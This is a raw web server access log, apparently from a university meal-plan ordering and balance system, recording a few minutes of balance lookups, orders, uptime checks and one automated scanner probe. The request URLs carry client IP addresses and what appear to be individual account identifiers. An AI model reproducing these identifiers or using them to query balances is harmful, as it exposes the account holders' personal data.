41.79.97.5 - - [06/Nov/2023:09:40:56 +0000] "GET /API/api/getCurrentBalance/65752024 HTTP/1.1" 200 1756 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:40:56 +0000] "GET /API/api/getCurrentBalance/30432027 HTTP/1.1" 200 1743 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:40:59 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1487 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:41:00 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1503 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:03 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1499 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:18 +0000] "GET /API/api/getCurrentBalance/57632026 HTTP/1.1" 200 1747 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:20 +0000] "GET /API/api/getCurrentBalance/57632026 HTTP/1.1" 200 1731 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:24 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1507 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:50 +0000] "GET /API/api/getCurrentBalance/55072026 HTTP/1.1" 200 1742 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:52 +0000] "GET /API/api/getCurrentBalance/55072026 HTTP/1.1" 200 1726 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:41:58 +0000] "HEAD /vendor/public/admin HTTP/1.1" 302 6089 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:41:58 +0000] "HEAD /vendor/public/admin/login HTTP/1.1" 200 1426 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:41:57 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1485 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:41:58 +0000] "GET /API/api/getCurrentBalance/90242026 HTTP/1.1" 200 1719 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:09 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1508 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:23 +0000] "GET /API/api/getCurrentBalance/48312026 HTTP/1.1" 200 1724 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:30 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1487 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:36 +0000] "GET /API/api/getCurrentBalance/54982026 HTTP/1.1" 200 1732 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:45 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1487 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:54 +0000] "GET /API/api/getCurrentBalance/77752026 HTTP/1.1" 200 1742 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:42:56 +0000] "GET /API/api/getCurrentBalance/77752026 HTTP/1.1" 200 1742 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:00 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1501 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:03 +0000] "-" 408 5148 "-" "-"
41.79.97.5 - - [06/Nov/2023:09:43:10 +0000] "GET /API/api/getCurrentBalance/49792026 HTTP/1.1" 200 1713 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:18 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1484 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:41 +0000] "GET /API/api/getCurrentBalance/87932025 HTTP/1.1" 200 1729 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:42 +0000] "GET /API/api/getCurrentBalance/87932025 HTTP/1.1" 200 1745 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:43:46 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1506 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:43:58 +0000] "HEAD /subscriber HTTP/1.1" 301 5373 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:43:58 +0000] "HEAD /subscriber/ HTTP/1.1" 200 866 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
154.160.0.223 - - [06/Nov/2023:09:44:00 +0000] "GET /API/api/getCurrentBalance/02452026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:44:05 +0000] "GET /API/api/getCurrentBalance/26002025 HTTP/1.1" 200 1729 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:44:07 +0000] "GET /API/api/getCurrentBalance/26002025 HTTP/1.1" 200 1729 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:44:08 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1485 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:44:13 +0000] "HEAD /admin HTTP/1.1" 301 5368 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:44:13 +0000] "HEAD /admin/ HTTP/1.1" 302 1556 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:44:12 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1488 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:44:14 +0000] "HEAD /admin/admin/login HTTP/1.1" 200 1494 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:45:07 +0000] "HEAD /pos HTTP/1.1" 301 5366 "https://mplan.ashesi.edu.gh/pos" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:45:07 +0000] "HEAD /pos/ HTTP/1.1" 200 867 "https://mplan.ashesi.edu.gh/pos" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:45:13 +0000] "GET /API/api/getCurrentBalance/81042025 HTTP/1.1" 200 1730 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:45:15 +0000] "GET /API/api/getCurrentBalance/81042025 HTTP/1.1" 200 1730 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:45:19 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1486 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:45:25 +0000] "GET /API/api/getCurrentBalance/89352026 HTTP/1.1" 200 1758 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:45:30 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1488 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:04 +0000] "GET /API/api/getCurrentBalance/30842027 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:06 +0000] "GET /API/api/getCurrentBalance/30842027 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:10 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1503 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:37 +0000] "GET /API/api/getCurrentBalance/30002027 HTTP/1.1" 200 1752 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
102.176.94.19 - - [06/Nov/2023:09:46:40 +0000] "GET /subscriber/ HTTP/1.1" 200 5934 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 EdgA/118.0.2088.66"
102.176.94.19 - - [06/Nov/2023:09:46:40 +0000] "GET /subscriber/assets/index-919520b5.css HTTP/1.1" 200 6623 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 EdgA/118.0.2088.66"
102.176.94.19 - - [06/Nov/2023:09:46:40 +0000] "GET /subscriber/assets/index-e7c9cb4e.js HTTP/1.1" 200 187467 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 EdgA/118.0.2088.66"
41.79.97.5 - - [06/Nov/2023:09:46:39 +0000] "GET /API/api/getCurrentBalance/30002027 HTTP/1.1" 200 1768 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:44 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1503 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:46:55 +0000] "GET /subscriber/ HTTP/1.1" 200 5902 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:46:56 +0000] "GET /subscriber/assets/index-e7c9cb4e.js HTTP/1.1" 200 187467 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
216.144.248.27 - - [06/Nov/2023:09:46:58 +0000] "HEAD /vendor/public/admin HTTP/1.1" 302 6087 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:46:58 +0000] "HEAD /vendor/public/admin/login HTTP/1.1" 200 1424 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:46:58 +0000] "GET /API/api/getCurrentBalance/30472027 HTTP/1.1" 200 1750 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
102.176.94.19 - - [06/Nov/2023:09:47:00 +0000] "-" 408 5164 "-" "-"
41.79.97.5 - - [06/Nov/2023:09:47:00 +0000] "GET /API/api/getCurrentBalance/30472027 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:04 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1485 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:06 +0000] "GET /subscriber/assets/index-919520b5.css HTTP/1.1" 200 6623 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:47:07 +0000] "GET /subscriber/vite.svg HTTP/1.1" 200 6957 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:47:07 +0000] "GET /subscriber/assets/headerimg-5519f95f.png HTTP/1.1" 200 1760353 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:47:16 +0000] "GET /API/api/getCurrentBalance/63862026 HTTP/1.1" 200 6341 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:47:19 +0000] "GET /API/api/getCurrentBalance/11019999 HTTP/1.1" 200 1774 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:21 +0000] "GET /API/api/getCurrentBalance/11019999 HTTP/1.1" 200 1774 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:26 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1046 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:25 +0000] "GET /API/api/getCurrentBalance/59422026 HTTP/1.1" 200 6355 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:27 +0000] "GET /API/api/getCurrentBalance/59422026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:28 +0000] "GET /API/api/getCurrentBalance/55072026 HTTP/1.1" 200 1742 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:31 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1501 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:38 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1491 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:38 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1499 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:47:52 +0000] "GET / HTTP/1.1" 302 5441 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:01 +0000] "GET /API/api/getCurrentBalance/91162025 HTTP/1.1" 200 1717 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:03 +0000] "GET /API/api/getCurrentBalance/91162025 HTTP/1.1" 200 1717 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:06 +0000] "GET /API/api/getCurrentBalance/78132026 HTTP/1.1" 200 1745 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:08 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1502 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:23 +0000] "GET /API/api/getCurrentBalance/2822024 HTTP/1.1" 200 1021 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:25 +0000] "GET /API/api/getCurrentBalance/65202026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:27 +0000] "GET /API/api/getCurrentBalance/65202026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:34 +0000] "GET /API/api/getCurrentBalance/28822024 HTTP/1.1" 200 1750 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:38 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1499 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:41 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1501 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:51 +0000] "GET /API/api/getCurrentBalance/08672026 HTTP/1.1" 200 6348 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:48:55 +0000] "-" 408 5148 "-" "-"
216.144.248.27 - - [06/Nov/2023:09:48:58 +0000] "HEAD /subscriber HTTP/1.1" 301 5373 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:48:58 +0000] "HEAD /subscriber/ HTTP/1.1" 200 866 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
162.243.133.48 - - [06/Nov/2023:09:49:03 +0000] "GET /portal/redlion HTTP/1.1" 404 436 "-" "Mozilla/5.0 zgrab/0.x"
41.79.97.5 - - [06/Nov/2023:09:49:08 +0000] "GET / HTTP/1.1" 302 5457 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:09 +0000] "GET / HTTP/1.1" 302 5425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:49:09 +0000] "GET /subscriber HTTP/1.1" 301 630 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:49:09 +0000] "GET /subscriber/ HTTP/1.1" 200 753 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
216.144.248.27 - - [06/Nov/2023:09:49:13 +0000] "HEAD /admin HTTP/1.1" 301 5368 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:49:13 +0000] "HEAD /admin/ HTTP/1.1" 302 1556 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:49:14 +0000] "HEAD /admin/admin/login HTTP/1.1" 200 1490 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:49:18 +0000] "GET /API/api/getCurrentBalance/78032026 HTTP/1.1" 200 6351 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
